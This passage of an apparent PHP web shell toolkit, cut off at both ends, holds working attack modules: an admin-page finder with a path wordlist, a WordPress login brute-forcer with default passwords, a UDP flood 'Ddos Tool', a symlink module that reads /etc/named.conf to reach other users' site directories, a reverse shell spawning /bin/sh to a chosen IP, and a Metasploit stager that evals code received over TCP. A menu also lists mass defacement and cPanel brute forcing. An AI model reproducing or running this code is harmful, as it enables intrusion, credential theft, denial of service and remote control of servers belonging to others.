admin_area/index.html
admincp/index.asp
admincp/login.asp
admincp/index.html
webadmin/index.html
webadmin/admin.html
webadmin/login.html
admin/admin_login.html
admin_login.html
panel-administracion/login.html
nsw/admin/login.php
webadmin/login.php
admin/admin_login.php
admin_login.php
admin_area/admin.html
pages/admin/admin-login.php
admin/admin-login.php
admin-login.php
bb-admin/index.html
bb-admin/login.html
bb-admin/admin.html
admin/home.html
pages/admin/admin-login.html
admin/admin-login.html
admin-login.html
admin/adminLogin.html
adminLogin.html
home.html
rcjakar/admin/login.php
adminarea/index.html
adminarea/admin.html
webadmin/index.php
webadmin/admin.php
user.html
modelsearch/login.html
adminarea/login.html
panel-administracion/index.html
panel-administracion/admin.html
modelsearch/index.html
modelsearch/admin.html
admincontrol/login.html
adm/index.html
adm.html
user.php
panel-administracion/login.php
wp-login.php
adminLogin.php
admin/adminLogin.php
home.php
adminarea/index.php
adminarea/admin.php
adminarea/login.php
panel-administracion/index.php
panel-administracion/admin.php
modelsearch/index.php
modelsearch/admin.php
admincontrol/login.php
adm/admloginuser.php
admloginuser.php
admin2/login.php
admin2/index.php
adm/index.php
adm.php
affiliate.php
adm_auth.php
memberadmin.php
administratorlogin.php
admin/admin.asp
admin_area/admin.asp
admin_area/login.asp
admin_area/index.asp
bb-admin/index.asp
bb-admin/login.asp
bb-admin/admin.asp
pages/admin/admin-login.asp
admin/admin-login.asp
admin-login.asp
user.asp
webadmin/index.asp
webadmin/admin.asp
webadmin/login.asp
admin/admin_login.asp
admin_login.asp
panel-administracion/login.asp
adminLogin.asp
admin/adminLogin.asp
home.asp
adminarea/index.asp
adminarea/admin.asp
adminarea/login.asp
panel-administracion/index.asp
panel-administracion/admin.asp
modelsearch/index.asp
modelsearch/admin.asp
admincontrol/login.asp
adm/admloginuser.asp
admloginuser.asp
admin2/login.asp
admin2/index.asp
adm/index.asp
adm.asp
affiliate.asp
adm_auth.asp
memberadmin.asp
administratorlogin.asp
siteadmin/login.asp
siteadmin/index.asp
ADMIN/
paneldecontrol/
login/
cms/
admon/
ADMON/
administrador/
ADMIN/login.php
panelc/
ADMIN/login.html";
                                                                        function template() {
                                                                            echo '

<script type="text/javascript">
<!--
function insertcode($text, $place, $replace)
{
    var $this = $text;
    var logbox = document.getElementById($place);
    if($replace == 0)
        document.getElementById($place).innerHTML = logbox.innerHTML+$this;
    else
        document.getElementById($place).innerHTML = $this;
//document.getElementById("helpbox").innerHTML = $this;
}
-->
</script>
<br>
<br>
<h1 class="technique-two">
       


</h1>

<div class="wrapper">
<div class="red">
<div class="tube">
<center><table class="tabnet"><th colspan="2">Admin Finder</th><tr><td>
<form action="" method="post" name="xploit_form">

<tr>
<tr>
	<b><td>URL</td>
	<td><input class="inputz" type="text" name="xploit_url" value="'.$_POST['xploit_url'].'" style="width: 350px;" />
	</td>
</tr><tr>
	<td>404 string</td>
	<td><input class="inputz" type="text" name="xploit_404string" value="'.$_POST['xploit_404string'].'" style="width: 350px;" />
	</td></b>
</tr><br><td>
<span style="float: center;"><input class="inputzbut" type="submit" name="xploit_submit" value=" Start Scan" align="center" />
</span></td></tr>
</form></td></tr>
<br /></table>
</div> <!-- /tube -->
</div> <!-- /red -->
<br />
<div class="green">
<div class="tube" id="rightcol">
Verificat: <span id="verified">0</span> / <span id="total">0</span><br />
<b>Found ones:<br /></b>
</div> <!-- /tube -->
</div></center><!-- /green -->
<br clear="all" /><br />
<div class="blue">
<div class="tube" id="logbox">
<br />
<br />
Admin page Finder :<br /><br />
</div> <!-- /tube -->
</div> <!-- /blue -->
</div> <!-- /wrapper -->
<br clear="all"><br>';
                                                                        }
                                                                        function show($msg, $br=1, $stop=0, $place='logbox', $replace=0) {
                                                                            if($br == 1) $msg .= "<br />";
                                                                            echo "<script type=\"text/javascript\">insertcode('".$msg."', '".$place."', '".$replace."');</script>";
                                                                            if($stop == 1) exit;
                                                                            @flush();@ob_flush();
                                                                        }
                                                                        function check($x, $front=0) {
                                                                            global $_POST,$site,$false;
                                                                            if($front == 0) $t = $site.$x;
                                                                            else $t = 'http://'.$x.'.'.$site.'/';
                                                                            $headers = get_headers($t);
                                                                            if (!eregi('200', $headers[0])) return 0;
                                                                            $data = @file_get_contents($t);
                                                                            if($_POST['xploit_404string'] == "") if($data == $false) return 0;
                                                                            if($_POST['xploit_404string'] != "") if(strpos($data, $_POST['xploit_404string'])) return 0;
                                                                            return 1;
                                                                        }

                                                                        // --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
                                                                        template();
                                                                        if(!isset($_POST['xploit_url'])) die;
                                                                        if($_POST['xploit_url'] == '') die;
                                                                        $site = $_POST['xploit_url'];
                                                                        if ($site[strlen($site)-1] != "/") $site .= "/";
                                                                        if($_POST['xploit_404string'] == "") $false = @file_get_contents($site."d65897f5380a21a42db94b3927b823d56ee1099a-this_can-t_exist.html");
                                                                        $list['end'] = str_replace("\r", "", $list['end']);
                                                                        $list['front'] = str_replace("\r", "", $list['front']);
                                                                        $pathes = explode("\n", $list['end']);
                                                                        $frontpathes = explode("\n", $list['front']);
                                                                        show(count($pathes)+count($frontpathes), 1, 0, 'total', 1);
                                                                        $verificate = 0;
                                                                        foreach($pathes as $path) {
                                                                            show('Checking '.$site.$path.' : ', 0, 0, 'logbox', 0);
                                                                            $verificate++; show($verificate, 0, 0, 'verified', 1);
                                                                            if(check($path) == 0) show('not found', 1, 0, 'logbox', 0);
                                                                            else{
                                                                                show('<span style="color: #00FF00;"><strong>found</strong></span>', 1, 0, 'logbox', 0);
                                                                                show('<a href="'.$site.$path.'">'.$site.$path.'</a>', 1, 0, 'rightcol', 0);
                                                                            }
                                                                        }
                                                                        preg_match("/\/\/(.*?)\//i", $site, $xx); $site = $xx[1];
                                                                        if(substr($site, 0, 3) == "www") $site = substr($site, 4);
                                                                        foreach($frontpathes as $frontpath) {
                                                                            show('Checking http://'.$frontpath.'.'.$site.'/ : ', 0, 0, 'logbox', 0);
                                                                            $verificate++; show($verificate, 0, 0, 'verified', 1);
                                                                            if(check($frontpath, 1) == 0) show('not found', 1, 0, 'logbox', 0);
                                                                            else{
                                                                                show('<span style="color: #00FF00;"><strong>found</strong></span>', 1, 0, 'logbox', 0);
                                                                                show('<a href="http://'.$frontpath.'.'.$site.'/">'.$frontpath.'.'.$site.'</a>', 1, 0, 'rightcol', 0);
                                                                            }

                                                                        }
                                                                        }
                                                                        //////////////////////////////////////////////////////////////////////////////

                                                                        elseif(isset($_GET['x']) && ($_GET['x'] == 'wpbrute'))
                                                                        {
                                                                        ?>
                                                                        <form action="?y=<?php echo $pwd; ?>&amp;x=wpbrute" method="post">
                                                                            <center>
                                                                                <br><Br><b><font size='2' >+--=[ Wordpress Brute Force ]=--+</font><br>
                                                                                    <center><p>Tanks To <a href="https://www.facebook.com/anton115" target="_blank">Cah_bagus</a></p></b></center>
                                                                            <form enctype="multipart/form-data" method="POST">
                                                                                <table width='624' border='0' class='tabnet' id='Box'>
                                                                                    <tr><th colspan="5">Wordpress Brute Force</th></tr>


                                                                                    <tr>
                                                                                        <td >&nbsp;</td>
                                                                                        <td ><p>Hosts:</p></td>
                                                                                        <td ><p> Users:</p></td>
                                                                                        <td ><p>Passwords:</p></td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>&nbsp;</td>
                                                                                        <td ><textarea style="background:black;" name="hosts" cols="30" rows="10" ><?php if($_POST){echo $_POST['hosts'];} ?></textarea></td>
                                                                                        <td ><textarea style="background:black;" name="usernames" cols="30" rows="10"  ><?php if($_POST){echo $_POST['usernames'];}else {echo "admin";} ?></textarea></td>
                                                                                        <td ><textarea style="background:black;" name="passwords" cols="30" rows="10"  ><?php if($_POST){echo $_POST['passwords'];}else {echo "admin\nadministrator\n123123\n123321\n123456\n1234567\n12345678\n123456789\n123456123456\nadmin2010\nadmin2011\npassword\nP@ssW0rd\n!@#$%^\n!@#$%^&*(\n(*&^%$#@!\n111111\n222222\n333333\n444444\n555555\n666666\n777777\n888888\n999999";} ?></textarea></td>
                                                                                    </tr>
                                                                                    <tr><td colspan="4"><input class='inputzbut' type="submit" name="submit" value="Brute Now"  />
                                                                                            <?php
                                                                                            if($_POST)
                                                                                            {
                                                                                                $hosts = trim(filter($_POST['hosts']));
                                                                                                $passwords = trim(filter($_POST['passwords']));
                                                                                                $usernames = trim(filter($_POST['usernames']));

                                                                                                if($passwords && $usernames && $hosts)
                                                                                                {
                                                                                                    $hosts_explode = explode("\n", $hosts);
                                                                                                    $usernames_explode = explode("\n", $usernames);
                                                                                                    $passwords_explode = explode("\n", $passwords);

                                                                                                    foreach($hosts_explode as $host)
                                                                                                    {
                                                                                                        $host = RemoveLastSlash($host);
                                                                                                        $hacked = 0;
                                                                                                        $host = str_replace(array("http://","https://","www."),"",trim($host));
                                                                                                        $host = "http://".$host;
                                                                                                        $wpAdmin = $host.'/wp-admin/';

                                                                                                        if(!url_exists($host."/wp-login.php"))
                                                                                                        {echo "<p>".$host." => <font color='red'>Error In Login Page !</font></p>";ob_flush();flush();continue;}

                                                                                                        foreach($usernames_explode as $username)
                                                                                                        {
                                                                                                            foreach($passwords_explode as $password)
                                                                                                            {
                                                                                                                $ch   =     curl_init();
                                                                                                                curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
                                                                                                                curl_setopt($ch,CURLOPT_URL,$host.'/wp-login.php');
                                                                                                                curl_setopt($ch,CURLOPT_COOKIEJAR,"coki.txt");
                                                                                                                curl_setopt($ch,CURLOPT_COOKIEFILE,"coki.txt");
                                                                                                                curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
                                                                                                                curl_setopt($ch,CURLOPT_POST,TRUE);
                                                                                                                curl_setopt($ch,CURLOPT_POSTFIELDS,"log=".$username."&pwd=".$password."&wp-submit=Giri&#8207;"."&redirect_to=".$wpAdmin."&testcookie=1");
                                                                                                                $login    =	   curl_exec($ch);

                                                                                                                if(eregi ("profile.php",$login) )
                                                                                                                {
                                                                                                                    $hacked = 1;
                                                                                                                    echo "<p>".$host." => UserName : [<font color='green'>".$username."</font>] : Password : [<font color='green'>".$password."</font>]</p>";
                                                                                                                    ob_flush();flush();break;
                                                                                                                }
                                                                                                            }
                                                                                                            if($hacked == 1){break;}
                                                                                                        }
                                                                                                        if($hacked == 0)
                                                                                                        {echo "<p>".$host." => <font color='red'>Failed !</font></p>";ob_flush();flush();}
                                                                                                    }
                                                                                                }
                                                                                                else {echo "<p><font color='red'>All fields are Required ! </font></p>";}
                                                                                            }
                                                                                            ?>
                                                                                        </td></tr>
                                                                                </table></form></center>
                                        <?php
                                        function url_exists($strURL)
                                        {
                                            $resURL = curl_init();
                                            curl_setopt($resURL, CURLOPT_URL, $strURL);
                                            curl_setopt($resURL, CURLOPT_BINARYTRANSFER, 1);
                                            curl_setopt($resURL, CURLOPT_HEADERFUNCTION, 'curlHeaderCallback');
                                            curl_setopt($resURL, CURLOPT_FAILONERROR, 1);
                                            curl_exec ($resURL);
                                            $intReturnCode = curl_getinfo($resURL, CURLINFO_HTTP_CODE);
                                            curl_close ($resURL);
                                            if ($intReturnCode != 200){return false;}
                                            else{return true ;}
                                        }
                                        function filter($string)
                                        {
                                            if(get_magic_quotes_gpc() != 0){return stripslashes($string);	}
                                            else{return $string;	}
                                        }
                                        function RemoveLastSlash($host)
                                        {
                                            if(strrpos($host, '/', -1) == strlen($host)-1)
                                            {return substr($host,0,strrpos($host, '/', -1));}
                                            else{return $host;}
                                        }
                                        echo "</p>";
                                        }


                                        //////////////////////////////////////////////////////////////////////////////
                                        elseif(isset($_GET['x']) && ($_GET['x'] == 'dos'))
                                        {
                                        ?>
                                        <form action="?y=<?php echo $pwd; ?>&amp;x=dos" method="post">
                                            <center><br><br><br>
                                                Your IP: <font color="red"><b><?php echo $my_ip; ?></b></font>&nbsp;(Don't DoS yourself nub)<br><br>
                                                <table class="tabnet" style="width:333px;padding:0 1px;">
                                                    <th colspan="5">Ddos Tool</th>
                                                    <tr><tr><td>IP Target</td><td>:</td>
                                                        <td><input type="text" class="inputz" name="ip" size="48" maxlength="25"  value = "0.0.0.0" onblur = "if ( this.value=='' ) this.value = '0.0.0.0';" onfocus = " if ( this.value == '0.0.0.0' ) this.value = '';"/>
                                                        </td></tr>
                                                    <tr><td>Time</td><td>:</td>
                                                        <td><input type="text" class="inputz" name="time" size="48" maxlength="25"  value = "time (in seconds)" onblur = "if ( this.value=='' ) this.value = 'time (in seconds)';" onfocus = " if ( this.value == 'time (in seconds)' ) this.value = '';"/>
                                                        </td></tr>

                                                    <tr><td>Port</td><td>:</td>
                                                        <td><input type="text" class="inputz" name="port" size="48" maxlength="5"  value = "port" onblur = "if ( this.value=='' ) this.value = 'port';" onfocus = " if ( this.value == 'port' ) this.value = '';"/>
                                                        </td></tr></tr></table></b><br>
                                                <input type="submit" class="inputzbut" name="fire" value="  Firee !!!   ">
                                                <br><br>
                                                <center>
                                                    After initiating the DoS attack, please wait while the browser loads.
                                                </center>

                                        </form>
                </center>
                <?php
                $submit = $_POST['fire'];
                if (isset($submit)) {

                    $packets = 0;
                    $ip = $_POST['ip'];
                    $rand = $_POST['port'];
                    set_time_limit(0);
                    ignore_user_abort(FALSE);

                    $exec_time = $_POST['time'];

                    $time = time();
                    print "Flooded: $ip on port $rand <br><br>";
                    $max_time = $time+$exec_time;



                    for($i=0;$i<65535;$i++){
                        $out .= "X";
                    }
                    while(1){
                        $packets++;
                        if(time() > $max_time){
                            break;
                        }

                        $fp = fsockopen("udp://$ip", $rand, $errno, $errstr, 5);
                        if($fp){
                            fwrite($fp, $out);
                            fclose($fp);
                        }
                    }
                    echo "Packet complete at ".time('h:i:s')." with $packets (" . round(($packets*65)/1024, 2) . " mB) packets averaging ". round($packets/$exec_time, 2) . " packets/s \n";
                }
                }

                elseif(isset($_GET['x']) && ($_GET['x'] == 'symlink'))
                {
                ?>
                <form action="?y=<?php echo $pwd; ?>&amp;x=symlink" method="post">

                    <?php

                    @set_time_limit(0);

                    echo "<br><br><center><h1>+--=[ Symlink ]=--+</h1></center><br><br><center><div class=content>";

                    @mkdir('sym',0777);
                    $htaccess  = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
                    $write =@fopen ('sym/.htaccess','w');
                    fwrite($write ,$htaccess);
                    @symlink('/','sym/root');
                    $filelocation = basename(__FILE__);
                    $read_named_conf = @file('/etc/named.conf');
                    if(!$read_named_conf)
                    {
                        echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>";
                    }
                    else
                    {
                        echo "<br><br><div class='tmp'><table border='1' bordercolor='#00ff00' width='500' cellpadding='1' cellspacing='0'><td>Domains</td><td>Users</td><td>symlink </td>";
                        foreach($read_named_conf as $subject){
                            if(eregi('zone',$subject)){
                                preg_match_all('#zone "(.*)"#',$subject,$string);
                                flush();
                                if(strlen(trim($string[1][0])) >2){
                                    $UID = posix_getpwuid(@fileowner('/etc/valiases/'.$string[1][0]));
                                    $name = $UID['name'] ;
                                    @symlink('/','sym/root');
                                    $name   = $string[1][0];
                                    $iran   = '\.ir';
                                    $israel = '\.il';
                                    $indo   = '\.id';
                                    $sg12   = '\.sg';
                                    $edu    = '\.edu';
                                    $gov    = '\.gov';
                                    $gose   = '\.go';
                                    $gober  = '\.gob';
                                    $mil1   = '\.mil';
                                    $mil2   = '\.mi';
                                    $malay	= '\.my';
                                    $china	= '\.cn';
                                    $japan	= '\.jp';
                                    $austr	= '\.au';
                                    $porn	= '\.xxx';
                                    $as		= '\.uk';
                                    $calfn	= '\.ca';

                                    if (eregi("$iran",$string[1][0]) or eregi("$israel",$string[1][0]) or eregi("$indo",$string[1][0])or eregi("$sg12",$string[1][0]) or eregi ("$edu",$string[1][0]) or eregi ("$gov",$string[1][0])
                                        or eregi ("$gose",$string[1][0]) or eregi("$gober",$string[1][0]) or eregi("$mil1",$string[1][0]) or eregi ("$mil2",$string[1][0])
                                        or eregi ("$malay",$string[1][0]) or eregi("$china",$string[1][0]) or eregi("$japan",$string[1][0]) or eregi ("$austr",$string[1][0])
                                        or eregi("$porn",$string[1][0]) or eregi("$as",$string[1][0]) or eregi ("$calfn",$string[1][0]))
                                    {
                                        $name = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>".$string[1][0].'</div>';
                                    }
                                    echo "
<tr>

<td>
<div class='dom'><a target='_blank' href=http://www.".$string[1][0].'/>'.$name.' </a> </div>
</td>

<td>
'.$UID['name']."
</td>

<td>
<a href='sym/root/home/".$UID['name']."/public_html' target='_blank'>Symlink </a>
</td>

</tr></div> ";
                                    flush();
                                }
                            }
                        }
                    }

                    echo "</center></table>";

                    }

                    elseif(isset($_GET['x']) && ($_GET['x'] == 'domain'))
                    {
                    ?>
                    <form action="?y=<?php echo $pwd; ?>&amp;x=domain" method="post">

                        <?php

                        echo '<br><br><center><h1>+--=[ local domain viewer ]=--+</h1></center><br><br><div class=content>';

                        $file = @implode(@file("/etc/named.conf"));
                        if(!$file){ die("# can't ReaD -> [ /etc/named.conf ]"); }
                        preg_match_all("#named/(.*?).db#",$file ,$r);
                        $domains = array_unique($r[1]);
                        //check();
                        //if(isset($_GET['ShowAll']))
                        {
                            echo "<table align=center border=1 width=59% cellpadding=5>
<tr><td colspan=2>[+] There are : [ <b>".count($domains)."</b> ] Domain</td></tr>
<tr><td>Domain</td><td>User</td></tr>";
                            foreach($domains as $domain){
                                $user = posix_getpwuid(@fileowner("/etc/valiases/".$domain));

                                echo "<tr><td>$domain</td><td>".$user['name']."</td></tr>";
                            }
                            echo "</table>";
                        }

                        echo '</div>';
                        }
                        //////////////////////////////////////////////////////
                        /////////////////////////////////////////////////////
                        elseif(isset($_GET['x']) && ($_GET['x'] == 'tool'))
                        {
                        ?>
                        <form action="?y=<?php echo $pwd; ?>&amp;x=tool" method="post">
                            <?php

                            error_reporting(0);
                            function ss($t){if (!get_magic_quotes_gpc()) return trim(urldecode($t));return trim(urldecode(stripslashes($t)));}
                            $s_my_ip = gethostbyname($_SERVER['HTTP_HOST']);$rsport = "443";$rsportb4 = $rsport;$rstarget4 = $s_my_ip;$s_result = "<br><br><br><center><table><div class='mybox' align='center'><td><h2>Reverse shell ( php )</h2><form method='post' actions='?y=<?php echo $pwd;?>&amp;x='tool'><table class='tabnet'><tr><td style='width:110px;'>Your IP</td><td><input style='width:100%;' class='inputz' type='text' name='rstarget4' value='".$rstarget4."' /></td></tr><tr><td>Port</td><td><input style='width:100%;' class='inputz' type='text' name='sqlportb4' value='".$rsportb4."' /></td></tr></table><input type='submit' name='xback_php' class='inputzbut' value='connect' style='width:120px;height:30px;margin:10px 2px 0 2px;' /><input type='hidden' name='d' value='".$pwd."' /></form></td><td><hr color='#4C83AF'><td><td><form method='POST'><table class='tabnet'><h2>Metasploit Connection </h2><tr><td style='width:110px;'>Your IP</td><td><input style='width:100%;' class='inputz' type='text' size='40' name='yip' value='".$my_ip."' /></td></tr><tr><td>Port</td><td><input style='width:100%;' class='inputz' type='text' size='5' name='yport' value='443' /></td></tr></table><input class='inputzbut' type='submit' value='Connect' name='metaConnect' style='width:120px;height:30px;margin:10px 2px 0 2px;'></form></td></div></center></table><br><br />";
                            echo $s_result;
                            if($_POST['metaConnect']){$ipaddr = $_POST['yip'];$port = $_POST['yport'];if ($ip == "" && $port == ""){echo "fill in the blanks";}else {if (FALSE !== strpos($ipaddr, ":")) {$ipaddr = "[". $ipaddr ."]";}if (is_callable('stream_socket_client')){$msgsock = stream_socket_client("tcp://{$ipaddr}:{$port}");if (!$msgsock){die();}$msgsock_type = 'stream';}elseif (is_callable('fsockopen')){$msgsock = fsockopen($ipaddr,$port);if (!$msgsock) {die(); }$msgsock_type = 'stream';}elseif (is_callable('socket_create')){$msgsock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);$res = socket_connect($msgsock, $ipaddr, $port);if (!$res) {die(); }$msgsock_type = 'socket';}else {die();}switch ($msgsock_type){case 'stream': $len = fread($msgsock, 4); break;case 'socket': $len = socket_read($msgsock, 4); break;}if (!$len) {die();}$a = unpack("Nlen", $len);$len = $a['len'];$buffer = '';while (strlen($buffer) < $len){switch ($msgsock_type) {case 'stream': $buffer .= fread($msgsock, $len-strlen($buffer)); break;case 'socket': $buffer .= socket_read($msgsock, $len-strlen($buffer));break;}}eval($buffer);echo "[*] Connection Terminated";die();}}
                            if(isset($_REQUEST['sqlportb4'])) $rsportb4 = ss($_REQUEST['sqlportb4']);
                            if(isset($_REQUEST['rstarget4'])) $rstarget4 = ss($_REQUEST['rstarget4']);
                            if ($_POST['xback_php']) {$ip = $rstarget4;$port = $rsportb4;$chunk_size = 1337;$write_a = null;$error_a = null;$shell = '/bin/sh';$daemon = 0;$debug = 0;if(function_exists('pcntl_fork')){$pid = pcntl_fork();
                                if ($pid == -1) exit(1);if ($pid) exit(0);if (posix_setsid() == -1) exit(1);$daemon = 1;}
                                umask(0);$sock = fsockopen($ip, $port, $errno, $errstr, 30);if(!$sock) exit(1);
                                $descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
                                $process = proc_open($shell, $descriptorspec, $pipes);
                                if(!is_resource($process)) exit(1);
                                stream_set_blocking($pipes[0], 0);
                                stream_set_blocking($pipes[1], 0);
                                stream_set_blocking($pipes[2], 0);
                                stream_set_blocking($sock, 0);
                                while(1){if(feof($sock)) break;if(feof($pipes[1])) break;$read_a = array($sock, $pipes[1], $pipes[2]);$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
                                    if(in_array($sock, $read_a)){$input = fread($sock, $chunk_size);fwrite($pipes[0], $input);}
                                    if(in_array($pipes[1], $read_a)){$input = fread($pipes[1], $chunk_size);fwrite($sock, $input);}
                                    if(in_array($pipes[2], $read_a)){$input = fread($pipes[2], $chunk_size);fwrite($sock, $input);}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);$rsres = " ";$s_result .= $rsres;}
                            }
                            ////////////////////////////////////////////////////////////////////////////
                            elseif(isset($_GET['x']) && ($_GET['x'] == 'whois'))
                            {
                            ?>
                            <form action="?y=<?php echo $pwd; ?>&x=whois" method="post">
                                <?php
                                @set_time_limit(0);
                                @error_reporting(0);
                                function sws_domain_info($site)
                                {
                                    $getip = @file_get_contents("http://networktools.nl/whois/$site");
                                    flush();
                                    $ip = @findit($getip,'<pre>','</pre>');
                                    return $ip;
                                    flush();
                                }
                                function sws_net_info($site)
                                {
                                    $getip = @file_get_contents("http://networktools.nl/asinfo/$site");
                                    $ip = @findit($getip,'<pre>','</pre>');
                                    return $ip;
                                    flush();
                                }
                                function sws_site_ser($site)
                                {
                                    $getip = @file_get_contents("http://networktools.nl/reverseip/$site");
                                    $ip = @findit($getip,'<pre>','</pre>');
                                    return $ip;
                                    flush();
                                }
                                function sws_sup_dom($site)
                                {
                                    $getip = @file_get_contents("http://www.magic-net.info/dns-and-ip-tools.dnslookup?subd=".$site."&Search+subdomains=Find+subdomains");
                                    $ip = @findit($getip,'<strong>Nameservers found:</strong>','<script type="text/javascript">');
                                    return $ip;
                                    flush();
                                }
                                function sws_port_scan($ip)
                                {
                                    $list_post = array('80','21','22','2082','25','53','110','443','143');
                                    foreach ($list_post as $o_port)
                                    {
                                        $connect = @fsockopen($ip,$o_port,$errno,$errstr,5);
                                        if($connect)
                                        {
                                            echo " $ip : $o_port ??? <u style=\"color: #00ff00\">Open</u> <br /><br />";
                                            flush();
                                        }
                                    }
                                }
                                function findit($mytext,$starttag,$endtag) {
                                    $posLeft = @stripos($mytext,$starttag)+strlen($starttag);
                                    $posRight = @stripos($mytext,$endtag,$posLeft+1);
                                    return @substr($mytext,$posLeft,$posRight-$posLeft);
                                    flush();
                                }
                                echo '<br><br><center>';
                                echo '
    <br />
    <div class="sc"><form method="post"><table class="tabnet">
	<tr><th colspan="5">Website Whois</th></tr>
    <tr><td>Site to scan </td><td>:</td><td><input type="text" name="site" size="50" style="color:#00ff00;background-color:#000000" class="inputz" value="site.com" /> &nbsp <input class="inputzbut" type="submit" style="color:#00ff00;background-color:#000000" name="scan" value="Scan !" /></td></tr>
    </table></form></div>';
                                if(isset($_POST['scan']))
                                {
                                    $site = @htmlentities($_POST['site']);
                                    if (empty($site)){die('<br /><br /> Not add IP .. !');}
                                    $ip_port = @gethostbyname($site);
                                    echo "
   <br /><div class=\"sc2\">Scanning [ $site ip $ip_port ] ... </div>
   <div class=\"tit\"> <br /><br />|-------------- Port Server ------------------| <br /></div>
   <div class=\"ru\"> <br /><br /><pre>
   ";
                                    echo "".sws_port_scan($ip_port)." </pre></div> ";
                                    flush();
                                    echo "<div class=\"tit\"><br /><br />|-------------- Domain Info ------------------| <br /> </div>
   <div class=\"ru\">
   <pre>".sws_domain_info($site)."</pre></div>";
                                    flush();
                                    echo "
   <div class=\"tit\"> <br /><br />|-------------- Network Info ------------------| <br /></div>
   <div class=\"ru\">
   <pre>".sws_net_info($site)."</pre> </div>";
                                    flush();
                                    echo "<div class=\"tit\"> <br /><br />|-------------- subdomains Server ------------------| <br /></div>
   <div class=\"ru\">
   <pre>".sws_sup_dom($site)."</pre> </div>";
                                    flush();
                                    echo "<div class=\"tit\"> <br /><br />|-------------- Site Server ------------------| <br /></div>
   <div class=\"ru\">
   <pre>".sws_site_ser($site)."</pre> </div>
   <div class=\"tit\"> <br /><br />|-------------- END ------------------| <br /></div>";
                                    flush();
                                }
                                echo '</center>';
                                }
                                ////////////////////////////////////////////////////// ///////////////////////////////////////////////////////////////////////////////////////////////////////

                                elseif(isset($_GET['x']) && ($_GET['x'] == 'tools'))
                                {
                                ?>
                                <form action="?y=<?php echo $pwd; ?>&x=tools" method="post">
                                    <center>
                                        <!-- menu start -->
                                        <center><div id="menu"><br><br>
                                                <a href="?<?php echo "y=".$pwd; ?>&amp;x=shell">Shell</a>
                                                <a href="?<?php echo "y=".$pwd; ?>&amp;x=php">Eval</a>
                                                <a href="?<?php echo "y=".$pwd; ?>&amp;x=sql">Mysql</a>
                                                <a href="?<?php echo "y=".$pwd; ?>&amp;x=dump">Database Dump</a>
                                                <a href="?<?php echo "y=".$pwd; ?>&amp;x=phpinfo">Php Info</a>
                                                <a href="?<?php echo "y=".$pwd; ?>&amp;x=netsploit">Net Sploit</a>
                                                <a href="?<?php echo "y=".$pwd; ?>&amp;x=upload">Upload</a>
                                                <a href="?<?php echo "y=".$pwd; ?>&amp;x=mail">E-Mail</a>
                                                <a href="?<?php echo "y=".$pwd; ?>&amp;x=sqli-scanner">SQLI Scan</a>
                                                <a href="?<?php echo "y=".$pwd; ?>&amp;x=port-sc">Port Scan</a>
                                                <a href="?<?php echo "y=".$pwd; ?>&amp;x=dos">Ddos</a>
												<a href="?<?php echo "y=".$pwd;	?>&amp;x=zhp">Zone-H</a>
                                                <a href="?<?php echo "y=".$pwd; ?>&amp;x=tool">Tools</a>
                                                <a href="?<?php echo "y=".$pwd; ?>&amp;x=python">python</a>
                                                <a href="?<?php echo "y=".$pwd; ?>&amp;x=symlink">Symlink</a><br><br>
                                                <a href="?<?php echo "y=".$pwd; ?>&amp;x=config">Config</a>
                                                <a href="?<?php echo "y=".$pwd; ?>&amp;x=bypass">Bypass</a>
                                                <a href="?<?php echo "y=".$pwd; ?>&amp;x=cgi">CgiShell</a>
                                                <a href="?<?php echo "y=".$pwd; ?>&amp;x=cgi2012">CGI Telnet 2012</a>
                                                <a href="?<?php echo "y=".$pwd; ?>&amp;x=domain">Domain</a>
                                                <a href="?<?php echo "y=".$pwd; ?>&amp;x=jodexer">Joomla IndChange</a>
                                                <a href="?<?php echo "y=".$pwd; ?>&amp;x=vb">VB IndChange</a>
                                                <a href="?<?php echo "y=".$pwd; ?>&amp;x=wp-reset">Wordpress ResPass</a>
                                                <a href="?<?php echo "y=".$pwd; ?>&amp;x=jm-reset">Joomla ResPass</a>
                                                <a href="?<?php echo "y=".$pwd; ?>&amp;x=whmcs">WHMCS Decoder</a>
                                                <a href="?<?php echo "y=".$pwd; ?>&amp;x=mass">Mass Deface</a><br><br>
                                                <a href="?<?php echo "y=".$pwd; ?>&amp;x=wpbrute">Wordpress BruteForce</a>
                                                <a href="?<?php echo "y=".$pwd; ?>&amp;x=jbrute">Joomla BruteForce</a>
                                                <a href="?<?php echo "y=".$pwd; ?>&amp;x=brute">Cpanel BruteForce</a>
                                                <a href="?<?php echo "y=".$pwd; ?>&amp;x=bypass-cf">Bypass CloudFlare</a>
                                                <a href="?<?php echo "y=".$pwd; ?>&amp;x=adfin">Admin Finder</a>
                                                <a href="?<?php echo "y=".$pwd; ?>&amp;x=hash">Password Hash</a>
                                                <a href="?<?php echo "y=".$pwd; ?>&amp;x=hashid">Hash ID</a>
                                                <a href="?<?php echo "y=".$pwd; ?>&amp;x=string">Script Encode</a><br><br>
												<a href="?<?php echo "y=".$pwd; ?>&amp;x=autoxploit">Auto Expliot</a>
                                                <a href="?<?php echo "y=".$pwd; ?>&amp;x=whois">Website Whois</a>
                                                <a href="?<?php echo "y=".$pwd; ?>&amp;x=jss">Joomla Server Scanner</a>
                                                <a href="?<?php echo "y=".$pwd; ?>&amp;x=cms_detect">Cms Detector</a>
                                                <a href="?<?php echo "y=".$pwd; ?>&amp;x=tutor">Tutorial & Ebook</a>
                                                <a href="?<?php echo "y=".$pwd; ?>&amp;x=about">About</a>
                                                


                                            </div></center>
                                        <!-- menu end -->
                                    </center>
									
									<?php

        }
        elseif(isset($_GET['x']) && ($_GET['x'] == 'drupkit')){
            ?>
									
			<script>
document.getElementById('exit').innerHTML='';
</script>
<head>
<STYLE>
